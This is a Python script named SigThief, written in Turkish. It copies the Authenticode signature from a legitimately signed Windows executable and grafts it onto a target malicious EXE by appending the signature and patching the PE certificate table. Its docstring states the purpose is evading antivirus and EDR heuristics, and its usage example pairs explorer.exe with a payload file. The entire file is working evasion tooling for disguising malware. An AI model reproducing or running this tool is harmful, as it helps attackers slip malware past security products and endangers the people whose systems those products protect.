#!/usr/bin/env python3
"""
SigThief - Digital Signature Spoofing Tool
Bu araç yasal bir dosyadan (örn: Microsoft signed exe) dijital imzayı kopyalar
ve hedeflenen zararlı bir EXE dosyasına enjekte eder. 
Bu işlem AV/EDR'lerin heuristik analizlerini atlatmak için son derece etkilidir.
"""
import struct
import sys
import shutil
import os

class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def gather_file_info(file_path):
    try:
        with open(file_path, 'rb') as f:
            f.seek(0x3C)
            pe_offset = struct.unpack('<I', f.read(4))[0]
            
            f.seek(pe_offset)
            magic = f.read(4)
            if magic != b'PE\0\0':
                return None
            
            f.seek(pe_offset + 24)
            opt_magic = struct.unpack('<H', f.read(2))[0]
            
            if opt_magic == 0x10b: # PE32
                cert_table_offset = pe_offset + 24 + 128
            elif opt_magic == 0x20b: # PE32+
                cert_table_offset = pe_offset + 24 + 144
            else:
                return None
                
            f.seek(cert_table_offset)
            cert_addr, cert_size = struct.unpack('<II', f.read(8))
            
            f.seek(0, 2)
            file_size = f.tell()
            
            return {
                'pe_offset': pe_offset,
                'cert_table_offset': cert_table_offset,
                'cert_addr': cert_addr,
                'cert_size': cert_size,
                'file_size': file_size
            }
    except Exception as e:
        print(f"[-] Hata (Bilgi Toplama): {e}")
        return None

def rip_signature(signed_file):
    info = gather_file_info(signed_file)
    if not info or info['cert_addr'] == 0:
        return None
    
    with open(signed_file, 'rb') as f:
        f.seek(info['cert_addr'])
        return f.read(info['cert_size'])

def inject_signature(target_file, sig_data, output_file=None):
    if not output_file:
        output_file = target_file + "_signed.exe"
        
    shutil.copy2(target_file, output_file)
    
    info = gather_file_info(output_file)
    if not info:
        return False
        
    try:
        with open(output_file, 'r+b') as f:
            # Eğer halihazırda imzası varsa (örneğin Nuitka'nın eklediği ufak şeyler vs.) sonuna ekle ve güncelle
            f.seek(0, 2)
            target_size = f.tell()
            
            # İmzayı dosyanın sonuna ekle
            f.write(sig_data)
            
            # PE Header'daki Sertifika Tablosunu Güncelle (Yeni boyut ve adres)
            f.seek(info['cert_table_offset'])
            f.write(struct.pack('<II', target_size, len(sig_data)))
            
        return output_file
    except Exception as e:
        print(f"[-] Hata (İmza Enjeksiyonu): {e}")
        return False

def check_sig(file_path):
    info = gather_file_info(file_path)
    if info and info['cert_addr'] != 0:
        print(f"{C.GREEN}[+] İmza Tespit Edildi! (Boyut: {info['cert_size']} bytes){C.RESET}")
        return True
    else:
        print(f"{C.RED}[-] Dosyada geçerli bir imza bloğu bulunamadı.{C.RESET}")
        return False

if __name__ == "__main__":
    print(f"{C.YELLOW}{C.BOLD}--- SigThief: Digital Signature Spoofing ---{C.RESET}")
    if len(sys.argv) < 3:
        print(f"Kullanım: python SigThief.py <İmzalı_Kaynak.exe> <Hedef_Zararlı.exe> [Çıktı_Adı.exe]")
        print(f"Örnek   : python SigThief.py C:\\Windows\\explorer.exe payload.exe payload_signed.exe")
        sys.exit(1)
        
    signed_src = sys.argv[1]
    target_exe = sys.argv[2]
    out_exe = sys.argv[3] if len(sys.argv) > 3 else target_exe + "_signed.exe"
    
    if not os.path.exists(signed_src):
        print(f"{C.RED}[-] Kaynak dosya bulunamadı: {signed_src}{C.RESET}")
        sys.exit(1)
        
    if not os.path.exists(target_exe):
        print(f"{C.RED}[-] Hedef dosya bulunamadı: {target_exe}{C.RESET}")
        sys.exit(1)
        
    print(f"[*] Kaynak dosyadan ({os.path.basename(signed_src)}) imza kopyalanıyor...")
    sig_data = rip_signature(signed_src)
    
    if not sig_data:
        print(f"{C.RED}[-] Kaynak dosyada bir dijital imza (Authenticode) bulunamadı!{C.RESET}")
        sys.exit(1)
        
    print(f"{C.GREEN}[+] İmza başarıyla çıkarıldı! (Boyut: {len(sig_data)} bytes){C.RESET}")
    print(f"[*] Hedef dosyaya ({os.path.basename(target_exe)}) imza enjekte ediliyor...")
    
    res = inject_signature(target_exe, sig_data, out_exe)
    if res:
        print(f"{C.GREEN}{C.BOLD}[+] İŞLEM BAŞARILI!{C.RESET}")
        print(f"{C.GREEN}[+] İmza sahteciliği yapılmış yeni dosya: {os.path.abspath(res)}{C.RESET}")
    else:
        print(f"{C.RED}[-] Enjeksiyon başarısız oldu.{C.RESET}")
